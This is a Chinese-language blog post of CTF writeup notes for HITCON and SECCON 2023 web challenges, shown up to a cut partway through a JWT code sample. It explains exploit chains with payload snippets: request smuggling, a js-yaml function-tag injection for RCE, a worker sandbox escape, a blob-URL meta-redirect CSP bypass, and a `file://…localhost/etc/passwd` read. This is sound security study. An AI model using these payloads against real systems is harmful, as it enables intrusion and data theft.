<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>HITCON CTF 2023 與 SECCON CTF 2023 筆記 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/" rel="alternate" hreflang="en" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/">
    





    <meta name="description" content="這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。 關鍵字列表：  nim json, null byte nim request smuggling js-yaml web worker blob URL meta redirect file protocol &amp; .localhost domain sxg: Signed Exchanges 431 CSP bypass">
<meta property="og:type" content="article">
<meta property="og:title" content="HITCON CTF 2023 與 SECCON CTF 2023 筆記">
<meta property="og:url" content="https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。 關鍵字列表：  nim json, null byte nim request smuggling js-yaml web worker blob URL meta redirect file protocol &amp; .localhost domain sxg: Signed Exchanges 431 CSP bypass">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.huli.tw/img/hitcon-seccon-ctf-2023-writeup/cover.png">
<meta property="article:published_time" content="2023-09-23T07:40:00.000Z">
<meta property="article:modified_time" content="2023-09-23T07:43:57.582Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/hitcon-seccon-ctf-2023-writeup/cover.png">



<link rel="alternative" href="/atom.xml" title="HITCON CTF 2023 與 SECCON CTF 2023 筆記" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=3.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#hitcon-ctf-2023">1&nbsp;&nbsp;<b>HITCON CTF 2023</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#login-system-7-solves">1.1&nbsp;&nbsp;Login System (7 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#canvas-4-solves">1.2&nbsp;&nbsp;Canvas (4 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#amf-4-solves">1.3&nbsp;&nbsp;AMF (4 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#harmony-2-solves">1.4&nbsp;&nbsp;Harmony (2 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#sharers-world-1-solve">1.5&nbsp;&nbsp;Sharer’s World (1 solve)</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#seccon-ctf-2023">2&nbsp;&nbsp;<b>SECCON CTF 2023</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#bad-jwt-107-solves">2.1&nbsp;&nbsp;Bad JWT (107 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#simplecalc-23-solves">2.2&nbsp;&nbsp;SimpleCalc (23 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#blink-14-solves">2.3&nbsp;&nbsp;blink (14 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#eeeeejs-12-solves">2.4&nbsp;&nbsp;eeeeejs (12 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#node-ppjail-5-solves">2.5&nbsp;&nbsp;node-ppjail (5 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#deno-ppjail-2-solves">2.6&nbsp;&nbsp;deno-ppjail (2 solves)</a>
                    
                    
                    
                    <a class="navbar-item" href="#hidden-note-1-solve">2.7&nbsp;&nbsp;hidden-note (1 solve)</a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2023/09/23/en/hitcon-seccon-ctf-2023-writeup/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            HITCON CTF 2023 與 SECCON CTF 2023 筆記
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2023-09-23T07:40:00.000Z" itemprop="datePublished">2023年9月23日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。</p>
<p>關鍵字列表：</p>
<ol>
<li>nim json, null byte</li>
<li>nim request smuggling</li>
<li>js-yaml</li>
<li>web worker</li>
<li>blob URL</li>
<li>meta redirect</li>
<li>file protocol &amp; .localhost domain</li>
<li>sxg: Signed Exchanges</li>
<li>431 CSP bypass</li>
<li>DOM clobbering document.body</li>
<li>ejs delimiter</li>
<li>Node.js + Deno prototye pollution gadget</li>
<li>XSleaks golang sort</li>
</ol>
<span id="more"></span>


<h2><span id="hitcon-ctf-2023">HITCON CTF 2023</span></h2><p>最近好像很少看到每一題都低於 10 組解出來的 web 題了，上次有這種整場比賽幾乎都是 hard web 可能是 DiceCTF 吧？不過我覺得難度是其次，好玩有趣有學到新東西才是重點，而這些題目在我看來很顯然有做到這點。</p>
<p>先附上兩位作者的 writeup，底下提到作者 writeup 就不額外附連結了：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/">https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023">https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023</a></li>
</ol>
<p>兩個作者的 writeup 都寫得很詳細，我這邊只是看完之後記錄一些重點而已。</p>
<h3><span id="login-system-7-solves">Login System (7 solves)</span></h3><p>這題有兩個 server，node.js 跟 nim，基本上大部分功能都是在 nim server 實現的，你可以登入、註冊以及修改密碼，而使用者的資料會存在 yaml 檔案裡面，目標是要達成 RCE。</p>
<p>第一個洞是 request smuggling，Node.js 接受 <code>Transfer-Encoding: CHUNKED</code> 但是 Nim 只看 <code>chunk</code>，可以利用這個差異來達成走私的目的。</p>
<p>但走私之後能幹嘛呢？</p>
<p>第二個洞是 Nim 對於 JSON 的行為，先把一個欄位設成很大的數字，Nim 會把它當作是一個 RawNumber，在更新的時候就會不帶引號，可以利用這點來達成 JSON injection。</p>
<p>第三個洞是有了 JSON injection 之後就可以利用 js-yaml 的功能創造出一個有 JS function 的物件，最後利用這個物件會在渲染時呼叫 toString，就達成 RCE 了。</p>
<p>大概會像這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">privilegeLevel</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">toString</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>js<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">></span> <span class="token string">"function ()&#123;console.log('hi')&#125;"</span>
<span class="token punctuation">&#125;</span>
<span class="token literal-property property">access</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'profile'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">register</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">login</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>喔對了，還有一個洞是 Nim 的檔案讀取，檔名的部分可以用 null byte 截斷：<code>test.yaml\u0000</code></p>
<h3><span id="canvas-4-solves">Canvas (4 solves)</span></h3><p>這題很有趣！</p>
<p>簡單來講就是把你的程式碼丟到 worker 裡面去執行，在 worker 裡面有做一些防護措施，讓你不能存取到 globalThis。就算在 worker 取得了 XSS，從 worker 唯一能做的事情就是往 main thread postMessage，但是結果會經過 <code>setHTML</code>，被瀏覽器的 Sanitizer API 給過濾掉。</p>
<p>worker 的 sandbox 滿有趣的，大概像是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">allKeys</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span>obj <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>
    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> fnCons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>
    <span class="token parameter">f</span> <span class="token operator">=></span> f<span class="token punctuation">.</span>constructor
  <span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> fnCons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">configurable</span><span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">const</span> cons <span class="token operator">=</span> <span class="token punctuation">[</span>Object<span class="token punctuation">,</span> Array<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Boolean<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> RegExp<span class="token punctuation">,</span> Promise<span class="token punctuation">,</span> Symbol<span class="token punctuation">,</span> BigInt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>fnCons<span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> cons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(1)</span><span class="token template-punctuation string">`</span></span>
<span class="token keyword">const</span> argNames <span class="token operator">=</span> <span class="token function">allKeys</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">)</span>
<span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token operator">...</span>argNames<span class="token punctuation">,</span> code<span class="token punctuation">)</span>
<span class="token keyword">const</span> <span class="token function-variable function">callUserFn</span> <span class="token operator">=</span> <span class="token parameter">t</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'User function error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// hardening</span>
<span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">callUserFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>argNames 是搜集所有 global 能存取到的東西的名稱，這樣就可以把所有東西的名稱都當作是函式的參數丟進去，大概就像是底下這種感覺：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token parameter">console<span class="token punctuation">,</span> Object<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> fetch<span class="token punctuation">,</span><span class="token operator">...</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>於是你不管拿到什麼都會是 <code>undefined</code>，在呼叫時 this 也傳入了 <code>Object.create(null)</code>，所以沒辦法輕易跳出來。</p>
<p>Maple 的預期解是利用 try catch 加上錯誤去拿：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor
<span class="token punctuation">&#125;</span>
Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructor
Error<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace
<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> g <span class="token operator">=</span> e<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>target
  <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> g <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這招他之前在 DiceCTF 2022 - undefined 這題也用過類似的。</p>
<p>不過對於這題來說有個更容易的解法，利用 this 預設的特性，如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#125;</span>
<span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在 JavaScript 裡面，呼叫一個 function 時預設的 this 就會是 global，用這樣就可以繞過限制。</p>
<p>但繞過限制之後要幹嘛呢？在 worker 裡面拿到 XSS 之後好像做不了什麼事情，因為 main thread 的 <code>setHTML</code> 會做過濾，而且這題的 CSP 是 <code>default-src &#39;self&#39; &#39;unsafe-eval&#39;</code></p>
<p>關鍵就在於 blob URL，可以用 blob 新建一個 HTML 並且載入，這個新 HTML 的 origin 跟原本的是一樣的：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">this<span class="token punctuation">.</span>Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>peko&lt;/h1>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
location <span class="token operator">=</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>而這題讓我驚訝的地方是原來 <code>&lt;meta&gt;</code> 的跳轉也可以跳到 blob URL 去，所以結合 meta redirect 之後就可以把 top level page 變成是自己的 HTML，繞過 sanitizer 的限制。</p>
<p>但此時 CSP 會繼承，所以還是要繞過 CSP，這邊可以再次利用 worker.js，把 worker.js 當作是一般的 script 載入，就能夠在 main thread 底下執行 XSS 了。</p>
<p>這題真的很有趣，blob 的運用方式也很巧妙。</p>
<h3><span id="amf-4-solves">AMF (4 solves)</span></h3><p>有點懶得研究 python 的東西，就先放著吧，作者有寫 writeup。</p>
<h3><span id="harmony-2-solves">Harmony (2 solves)</span></h3><p>這題各種 Electron 黑魔法。</p>
<p>在 Chromium 中 <code>.localhost</code> 結尾的 domain 在利用 file protocol 時會被忽略，例如說：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; fail
file:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd

&#x2F;&#x2F; success
file:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>（我怎麼覺得以前我好像有無意間翻到過這一段的 code）</p>
<p>而 file:&#x2F;&#x2F; 會被 DOMPurify 濾掉，不過因為網頁本來就是 file，所以可以改成用 <code>//</code> 來繞過檢查。</p>
<p>接著，<code>file://</code> 在 Electorn 裡面都是 same-origin，所以載入自己的檔案以後就可以存取到 top.api</p>
<p>最後再結合一些 prototype pollution 的東西，就可以拿到 RCE（後半段我沒有仔細研究，可參考作者的 writeup）</p>
<h3><span id="sharers-world-1-solve">Sharer’s World (1 solve)</span></h3><p>這題的關鍵是一個叫做 SXG 的東西：<a target="_blank" rel="noopener" href="https://web.dev/signed-exchanges/">https://web.dev/signed-exchanges/</a></p>
<p>在這場比賽以前我完全沒聽過這個，而且 web.dev 上的參考資料居然 2021 就有了，看來我真的是 lag 太久了。</p>
<p>簡單來講呢，SXG 就是可以拿憑證對一個網頁做簽章，如此一來其他網站在發送這個簽過章的資源時，瀏覽器就可以把這個資源視為是有憑證的那個網站。</p>
<p>舉個例子，今天 example.com 的人拿著他們的私鑰對一個網站簽名，產生了一個 example.sxg 檔案，接著我拿到了這個檔案，放到我的主機上，網址是：<a target="_blank" rel="noopener" href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a></p>
<p>當使用者造訪 <a target="_blank" rel="noopener" href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a> 時，內容會是之前的網站，而網址會變成 example.com，就好像這個網頁是直接從 example.com 出來的一樣。</p>
<h2><span id="seccon-ctf-2023">SECCON CTF 2023</span></h2><p>身為一個 JavaScript 愛好者，這次的 SECCON CTF 的題目我很喜歡，充滿了一堆的 JavaScript。雖然說有些題目沒解出來，但依舊學到很多。</p>
<h3><span id="bad-jwt-107-solves">Bad JWT (107 solves)</span></h3><p>這題的目標是要產出一個 <code>isAdmin: true</code> 的 JWT，而重點在於驗證 JWT 的邏輯：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> algorithms <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token function-variable function">hs256</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> 
    <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function-variable function">hs512</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> 
    <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha512'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
